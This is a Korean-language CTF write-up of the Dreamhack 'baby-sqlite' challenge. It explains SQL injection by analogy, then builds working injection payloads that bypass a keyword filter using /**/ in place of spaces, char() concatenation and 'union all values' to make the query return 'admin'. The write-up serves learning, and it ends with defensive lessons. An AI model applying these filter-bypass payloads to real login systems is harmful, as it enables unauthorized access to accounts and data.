---
layout: post
title: "DH - SQL Injection 입문 - ② baby-sqlite"
date: 2024-09-28
author: Hoshi
cover: "/assets/img/back1.png"
tags: Dreamhack SQL SQL_Injection sqlite DH_level_2
categories: "Dreamhack"
---

# 문제

![problem]({{site.url}}/assets/img/posts_img/dh_baby_sqlite.png)

[https://dreamhack.io/wargame/challenges/1](https://dreamhack.io/wargame/challenges/1)

정보 보안 입문을 위해 OWASP Top 10 취약점중 하나인 인젝션(Injection), 그중에서도 가장 많이 알려진 SQL Injection에 대해 공부하기 위해 문제를 풀어보았다.

# SQL Injection?

**injection**의 단어 정의는 다음과 같다.

**Injection**

- **[名]** - 주사  
  **[名]** - (상황, 사업 등의 개선을 위한 거액의) 자금 투입)  
  **[名]** - (액체의) 주입  
  **<動> injection**

[예시](https://www.threads.net/@slamslam__/post/C-mSaVcvuXD)

이 게시글은 일종의 프롬포트 인젝션이라고 볼 수 있다. SQL Injection도 개념은 동일하다.

예를들어 식당의 웨이팅리스트 표가 있다고 가정해보자. 우리가 직원에게 몇명이 웨이팅을 할건지 말하면 아래와 같이 알아듣고 표를 기록한다.

> **이 식당 웨이팅 리스트 표에 {N}명의 추가웨이팅을 하려고 하며, 전화번호는 {XXX-XXXX-XXXX}입니다.**

이제 일행이 본인 포함해서 총 3명인 손님들이 와서 웨이팅을 걸려고 할때 직원은 아래와 같이 이해할 것이다.

> **이 식당 웨이팅 리스트 표에 {3}명의 추가 웨이팅을 하려고 하며, 전화번호는 {010-1234-5678}입니다.**

그런데 이 식당의 직원은 참 안타깝게도 생각이라는것을 하지않는 것으로 보인다;;;

당연히 N은 1명이상의 숫자만 될 수 있고 전화번호 또한 XXX-XXXX-XXXX 형식으로만 받아들이고 이해해야하는데,

이 직원은 일머리가 없어서 곧이 곧대로 받아들이고 표를 수정한다.

어떤 손님이 이 부분을 악용해서 이렇게 직원에게 말했다.

> 저 포함해서 **“1”**명이고 제 차례가 되면 “**_010-9876-5432 로 연락주세요. 그리고 웨이팅을 건 시간을 기준으로 내림차순으로 정렬해서 다시 적어주시고 이제 뒤에 나올 내용은 무시해주세요”_** 로 전화주세요.

무슨 말도 안되는 소리인가 싶지만 식당직원은 조금도 이상하게 여기지 않고 아래 내용대로 이해를 해버리고 만다.

> 이 식당 웨이팅 리스트 표에 **{1}**명의 추가 웨이팅을 하려고 하며, 전화번호는 **{010-9876-5432 로 연락주세요. 그리고 웨이팅을 건 시간을 기준으로 내림차순으로 정렬해서 다시 적어주시고 이제 뒤에 나올 내용은 무시해주세요}** ~~입니다.~~

결국 이 손님은 가장 웨이팅이 긴 시간에 가장 늦게 왔음에도 제일 먼저 식사를 할 수 있었다고 한다.

— The End —

이것이 인젝션 공격의 개념을 표현한 이야기이다.

그중에서도 SQL Injection 에 경우 위와 같이 악용하는 행위를 통해 서버의 SQL DB를 임의로 조작, 수정을 가하는 행위가 된다.

이정도 개념만 이해한 상태로 문제의 웹사이트에 접속해보도록 하자.

# 문제 풀이

> 경고! : 이 부분부터 풀이과정이 기술되어 있으니 혹시라도 문제를 풀어보려고 하는 분들은 여기서 멈추시고 풀고나서 다시 보시길 권장 드립니다.

![problem_web_login]({{site.url}}/assets/img/posts_img/dh_baby_sqlite_1.png)

이 문제의 로그인 화면이다. 하지만 이것만 보고는 취약점을 알 수 없으니 같이 제공해준 소스를 살펴보도록 하자.

```python
(...)
if __name__ == '__main__':
    os.system('rm -rf %s' % DATABASE)
    with app.app_context():
        conn = get_db()
        conn.execute('CREATE TABLE users (uid text, upw text, level integer);')
        conn.execute("INSERT INTO users VALUES ('dream','cometrue', 9);")
        conn.commit()
(...)
```

이 부분이 웹서버가 처음 켜질때 발생하는 작업들에 대한 코드다.
기존 DB가 있다면(찌꺼기 파일) 지우고, 새로운 DB와 테이블을 만들고 유저정보를 삽입(INSERT)하는데
잘보면 admin계정을 추가하는 코드가 아예 존재하지 않는다. 이부분 뿐만아니라 다른 곳을 찾아봐도 존재하지 않았다. 이를통해 이 문제를 푸는 방법을 세가지 중 하나일꺼라고 예상했다.

1. **DB 테이블에 있는 기존계정(uid가 dream 계정)의 uid를 admin계정 으로 변경하기**
2. **DB 테이블에 새로운 계정, admin을 추가하여 로그인하기**
3. **DB 테이블은 건들지 말되, 최종적으로 내부적으로 admin계정이 반환되도록만 하기**

```python
(...)
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')

    uid = request.form.get('uid', '').lower()
    upw = request.form.get('upw', '').lower()
    level = request.form.get('level', '9').lower()

    sqli_filter = ['[', ']', ',', 'admin', 'select', '\'', '"', '\t', '\n', '\r', '\x08', '\x09', '\x00', '\x0b', '\x0d', ' ']
    for x in sqli_filter:
        if uid.find(x) != -1:
            return 'No Hack!'
        if upw.find(x) != -1:
            return 'No Hack!'
        if level.find(x) != -1:
            return 'No Hack!'


    with app.app_context():
        conn = get_db()
        query = f"SELECT uid FROM users WHERE uid='{uid}' and upw='{upw}' and level={level};"
        try:
            req = conn.execute(query)
            result = req.fetchone()

            if result is not None:
                uid = result[0]
                if uid == 'admin':
                    return FLAG
        except:
            return 'Error!'
    return 'Good!'
(...)
```

이 부분이 로그인 페이지에 관련된 코드들이다.

일단 첫번째로 알수 있는 것은 유저에게 보여지는 필드는 두개지만 실제로 서버로 전송되어지는 매개변수는 세개라는 것이다.

따라서 인젝션 공격을 하려면 저 로그인 화면이 아닌 별도로 웹요청을 날려서 진행해야하는 것을 확인할 수 있다.

그 다음으로는 매개변수 필터링에 관한 코드다.

sqli_filter 리스트에 있는 문자열들이 각 매개변수에 존재하는지 검사하고 존재한다면 쿼리를 실행시키지 않고 리턴 시켜버리는 것을 알 수 있다. 따라서 인젝션 공격을 위해서는 별도의 우회책이 발견되지 않는 한 저 문구들을 사용하지 않고 쿼리를 작성해야한다는 것이다.

그런데 여기서 일차적인 걸림돌이 바로 공백(뛰어쓰기)까지 필터링에 걸린다는 것이었다.

공백없이는 왠만한 쿼리문의 작성이 거의 불가능에 가까워지기 때문이다.

나의 경우에도 한참을 고민하고 검색하다가 지쳐서 이문제에 대해 다른사람들이 쓴 질문글들을 몇개 읽어보게 되었다. 그곳에서 결정적인 힌트를 얻을 수 있었다.

공백으로 쿼리를 구분짓는 대신 그사이에 범위주석(/\*\*/)을 넣어서 구분을 하는것이다.

처음에는 보고 이게 된다고? 싶었다…
결국 테스트 해보고 정상 작동이 확인되는 것을 확인하였다.

그다음으로 걸렸던 부분이 바로 admin이라는 글자도 필터링이 된다는 것이었다.

그래서 글자하나하나를 일일이 넣고 문자열을 붙히는(concat) 방법을 생각했는데 다른 프로그래밍 언어와는 다르게 + 기호로는 연결이 되지 않아 고민했는데 검색을 통해 + 대신 \|\| 로 바꿔서 쓰면 사용이 가능하다는 것을 확인했다. 그래서 admin이라는 글자를 char()이라는 함수로 아스키 코드 숫자를 넣어서 아래와 같이 만들었다.

> **char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110))**

이를 바탕으로 아래와 같이 매개변수에 넣어서 기존계정을 admin계정으로 변조하는 쿼리문을 만들어내었다.

> uid=  
> upw=  
> level=1;update/**/users/**/set/**/uid=(char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110))  
> **Query : SELECT uid FROM users WHERE uid='' and upw='' and level=1;update//users//set/**/uid=(char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110));**

쿼리가 잘 동작하는 것까지 테스트 하고 문제 사이트에 웹 요청을 보냈는데…

![result1]({{site.url}}/assets/img/posts_img/dh_baby_sqlite_2.png)

… 에러가 발생했다.

분명 쿼리자체에는 이상이 없는것이 확인했기에 에러가 발생한 이유가 도저히 짐작히 되지 않았다.

여러 삽질을 하다가 끝내 제공받은 서버 코드(파이썬 코드)를 로컬에서 디버깅을 해보게 되었다.
자세한 오류코드를 확인하기 우해 try except 문도 제거 한상태로 무슨 에러인지 확인했다.

그 결과 명확한 이유가 traceback에 출력이 되었다.

sqlite3의 라이브러리에 포함된 execute 함수는 오직 하나의 쿼리만을 실행할 수 있다는 것이었다.

이렇게 되면 INSERT와 UPDATE문은 기존 SELECT문을 유지한 상태로 이어서 작성해야하는 쿼리였기 때문에 맨 처음 위에서 말했던 방법 세가지중 1,2번 방법이 모두 사용이 불가하게 된것이다.

그럼 결국 3번 방법, 테이블에 별도로 수정을 가하지 않고, 오직 출력에만 admin 계정이 나오게 해야한다는 것이다. 그러나 uid,upw 필드는 작은따움표로 묶여있어 이 안에서는 주석 기호를 넣어도 작동하지 않으니 사용이 불가능했다. (물론 작은따움표도 필터링 되었다.)

그럼 유일하게 level 필드만 이용가능하다는 것인데 추가 쿼리를 작성하지 않고 where 문 이후로 나올 수 있는 문법은 오직 where 의 추가 조건과 UNION 밖에 존재 하지 않았다.

where의 추가 조건을 더 넣는다고 해도 이미 있는 SELECT문 만으로는 dream 계정밖에 반환할 수 없기때문에 무슨 조건을 넣어도 admin 을 반환시킬 방법이 없었다. 그래서 자연스럽게 UNION문을 사용하는 쪽으로 방향이 기울게 되었다.

그러나 UNION 문의 사용예시를 찾아보면 모두 SELECT문을 이어서 사용해 값을 출력한후 UNION문 양쪽에 있는 값을 잇는 방식이었다.

그러나 SELECT라는 문자열 자체가 필터에 걸렸기때문에 다른 대체 문법을 생각해내야겠다. 구글링, 특히나 이 문제에 사용된 DB 인 Sqlite의 공식문서까지 정도 했으나 도저히 대체 방법이 떠오르지 않았다.

서브쿼리를 활용해 볼까도 고민했으나 서브 쿼리 내부에는 기본적으로 Select문밖에 사용할 수 없기에 사용할 수 없었다.

그래서 공식문서만 몇번을 읽다가 지쳐있던 와중에 눈에 들어온 함수가 있었다.

![sqlite_document]({{site.url}}/assets/img/posts_img/dh_baby_sqlite_3.png)

(편의상 번역기로 번역하였음.)

이 Values 함수가 Select ~~ UNION ALL ~~ 과 동일한 역할을 할 수 있다는 내용을 확인하고 곧장 다시 아래와 같이 쿼리문을 작성하였다.

> uid=dream  
> upw=cometrue  
> level=9/**/union/**/all/**/values((char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110)))  
> **Query : SELECT uid FROM users WHERE uid='dream' and upw='cometrue' and level=9/**/union/**/all/**/values((char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110)));**

테스트 결과 dream계정과 admin 계정이 동시에 담긴 테이블이 반환되는 것을 확인했다.

그러나 위에 파이썬 코드중 uid를 검사하는 부분을 보면 쿼리를 실행후 반환된 테이블의 ROW값중 최상단 값만을 가져와서 검사를 하기때문에 admin계정을 dream 계정보다 최상단에 보여지게 해야했기에
ORDER BY 명령으로 정렬을 할가 고민했으나 VALUES 함수 뒤에 ORDER BY를 사용할 수 없기에 다른방법을 고민했다.

그러나 이 문제는 생각보다 간단하게 해결되었다.

바로 앞에 Select문에서 dream계정이 반환이 안되게 하여 ROW 갯수가 0인 테이블을 반환시키고 그다음 UNION 작업을 수행하면 되는 거였다.

그래서 최종적으로 이렇게 매개변수를 작성하여 제출하였다.

> uid=  
> upw=  
> level=9/**/union/**/all/**/values((char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110)))  
> **Query : SELECT uid FROM users WHERE uid='' and upw='' and level=9/**/union/**/all/**/values((char(97)\|\|char(100)\|\|char(109)\|\|char(105)\|\|char(110)));**

![result2]({{site.url}}/assets/img/posts_img/dh_baby_sqlite_4.png)

드디어 FLAG를 획득했다…

# 결론

이를 통해 알게된 내용은 아래 와 같다.

1. **파이썬의 sqlite3 라이브러리에서 execute함수는 오직 한개의 쿼리만 수행할 수 있다.**
2. **SQL Injection은 꼭 테이블을 위조, 조작하는 것 뿐만아니라 단순히 의도치 않는 출력을 만들어 내는 것 또한 포함된다.**
3. **공백을 범위 주석(/\*\*/)으로 대체하는게 가능하다 (… 이건 아직도 신기하다)**
4. **SQL 인젝션을 단순 필터로 막기에는 상대적으로 힘들다. 서비스를 만들때 이미 어느정도의 보안 솔루션이 갖춰져 있는 ORM이나 다른 라이브러리등을 생각해보는게 그나마 쉬워보인다…**
